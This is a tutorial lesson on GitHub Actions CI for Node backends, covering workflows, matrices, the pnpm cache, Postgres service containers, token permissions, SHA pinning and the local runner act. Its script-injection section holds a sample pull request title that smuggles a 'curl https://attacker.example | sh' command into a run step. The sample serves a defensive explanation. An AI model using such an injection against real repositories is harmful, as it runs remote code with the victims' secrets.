---
title: "GitHub Actions in practice"
skills: [github-actions, ci-workflow-security]
---

GitHub Actions is where most small teams run CI, and its YAML is easy to write badly. This lesson covers the model (workflows, jobs, steps), the pieces you will use in every Node backend (matrices, the pnpm cache, a Postgres service container, secrets) and the security settings that stop a pull request from a stranger turning into a compromised repository. It ends with `act`, which runs workflows on your machine, and where it differs from the real thing.

## The model

A **workflow** is a YAML file in `.github/workflows/`. Its `on:` section lists the **events** that start it. A workflow has one or more **jobs**; each job gets a fresh virtual machine (a **runner**), and jobs run in parallel unless one lists another in `needs`. A job is a list of **steps** that run in order on the same machine and share its file system. A step either runs a shell command (`run:`) or calls an **action** (`uses:`), which is a reusable program from another repository.

```yaml
name: CI
on:
  pull_request:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: node --version
  image:
    needs: test # waits for test; skipped if test fails
    runs-on: ubuntu-latest
    steps:
      - run: echo "build the image here"
```

`${{ ... }}` is an **expression**. GitHub evaluates it before the step runs, using **contexts** such as `github` (the event, the ref, the commit SHA), `matrix`, `env` and `secrets`. Keep that "before" in mind; it matters for security below.

## Matrices

A matrix runs one job definition once per combination of values:

```yaml
jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        node: [24, 26]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: ${{ matrix.node }}
```

Each combination is a separate job you pay for. A matrix of three operating systems and three Node versions is nine jobs for every push. Test what you actually run: for a server, that is usually Linux, with the Node version in production and the next one you plan to move to. `fail-fast: false` lets the other combinations finish when one fails, so you see whether the failure is specific to one version.

## Node, pnpm and the cache

Three actions set up the toolchain. The order matters, because `setup-node` asks pnpm where its store is in order to cache it:

```yaml
steps:
  - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  - uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
  - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
    with:
      node-version-file: .nvmrc
      cache: pnpm
  - run: pnpm install --frozen-lockfile
```

`pnpm/action-setup` reads the pnpm version from the `packageManager` field in `package.json`, and `node-version-file` reads `.nvmrc`, so the versions live in the repository, not in the workflow. `cache: pnpm` restores the store keyed by a hash of `pnpm-lock.yaml` and saves it at the end of the job. Since setup-node v6 this is opt-in for pnpm. The newer `pnpm/setup` action can install pnpm, Node and dependencies in one step with its own cache; either works.

## A Postgres service container

Integration tests want a real database. A **service container** is a Docker container that the runner starts before your steps and removes afterwards:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:18-alpine
        env:
          POSTGRES_PASSWORD: test
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 2s
          --health-retries 20
    env:
      DATABASE_URL: postgres://postgres:test@localhost:5432/postgres
    steps:
      - run: pnpm test
```

The health check makes the runner wait until Postgres accepts connections; without it the first test can fail with "connection refused". The port mapping makes it reachable on `localhost` from steps that run directly on the runner. Service containers need a Linux runner. Hosted Ubuntu runners also have Docker, so Testcontainers (module 5) works there too; a service container is simpler, Testcontainers gives each test file its own database.

## Secrets and the token

Repository and environment **secrets** are read through `${{ secrets.NAME }}`. GitHub masks their values in logs, but only the exact string: a base64-encoded or sliced secret is printed in clear. Workflows started by pull requests from forks get no secrets at all.

Every job also gets a short-lived `GITHUB_TOKEN`. Set its scope explicitly at the top of every workflow, and widen it only on the job that needs more:

```yaml
permissions:
  contents: read

jobs:
  image:
    permissions:
      contents: read
      packages: write # this job pushes to ghcr.io
```

Job-level `permissions` replace the workflow-level ones; they do not add to them. That is why `contents: read` is repeated.

### Two classic holes

**Script injection.** Because expressions are expanded before the shell runs, this step executes whatever the pull request title contains:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

A title of `"; curl https://attacker.example | sh; "` becomes code. Pass untrusted values through the environment, where the shell treats them as data:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

**`pull_request_target`.** This event runs the workflow from the base branch with secrets and a token that can write, even for forks. It exists for jobs like labelling. Combined with a checkout of the pull request's code, it runs a stranger's code (their `postinstall` scripts, their tests) with your secrets. Use `pull_request` for CI.

## Pin actions by commit SHA

`uses: some/action@v4` points at a tag, and tags can be moved. In March 2025 the popular `tj-actions/changed-files` action was compromised and its tags were moved to a malicious commit that printed secrets into build logs. Every workflow that used a tag ran the new code on its next run.

A full 40-character commit SHA cannot be moved. Keep the version in a comment for humans:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Find the SHA with `git ls-remote --tags https://github.com/actions/checkout`, and let Dependabot or Renovate propose updates, which bump the SHA and the comment together. Organisations can enforce SHA pinning in their Actions policy. GitHub has also added workflow lockfiles (`.github/workflows/actions.lock`, maintained with the `gh actions-lock` CLI extension), which record the exact commit of every action, including actions that other actions use. Where a repository adopts one, it replaces SHA pins in the workflow files.

## Two settings that save minutes

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

A new push to a branch cancels the run it supersedes. Include the ref in the group; a constant group would cancel runs on other branches. Then set `timeout-minutes` on every job: the default is six hours, and a hung test will use all of it.

## Running workflows locally with `act`

[`act`](https://nektosact.com/) reads your workflows and runs the jobs in Docker containers on your machine. It is the fastest way to iterate on YAML without pushing ten "fix ci" commits.

```sh
act -l                                  # list jobs for the push event
act pull_request -j verify              # run one job as if a PR was opened
act pull_request --secret-file .secrets # secrets in .env format, git-ignored
act -P ubuntu-latest=catthehacker/ubuntu:act-latest  # choose the runner image
```

Know its limits before you trust a green local run:

- It needs Docker, and the default runner images are much smaller than GitHub's. Tools preinstalled on hosted runners may be missing; the "medium" image above is the usual compromise.
- It ignores `permissions`, `concurrency`, `timeout-minutes` and `environment`, and has no OIDC token, so it cannot test any of the security settings in this lesson.
- Event payloads are minimal. Expressions that read `github.event` fields may need a payload file passed with `-e`.
- It runs on your CPU architecture. On an ARM laptop, x86-only images need `--container-architecture linux/amd64`.

Use `act` for syntax, step order and scripts. GitHub stays the source of truth.

## Common mistakes

- Putting `${{ github.event.* }}` or `${{ secrets.* }}` straight into a `run:` script.
- Leaving out `permissions:`, so the token gets whatever the repository default is, which on older repositories includes write access.
- Pinning to `@v4` or `@main` and assuming nothing changes.
- Adding `cache: pnpm` before pnpm is installed, which fails because setup-node cannot find the store.
- A service container without a health check, so tests race the database start-up.
- `continue-on-error: true` or `|| true` "temporarily" on a failing step.

## Go deeper

- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax): every key used in this lesson.
- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use): GitHub's own guidance on tokens, injection, `pull_request_target` and pinning.
- [Creating PostgreSQL service containers](https://docs.github.com/en/actions/tutorials/use-containerized-services/create-postgresql-service-containers): the service container options in full.
- [Workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles): the newer alternative to SHA pins.
- [act user guide](https://nektosact.com/): installation, runner images and the list of unsupported features.
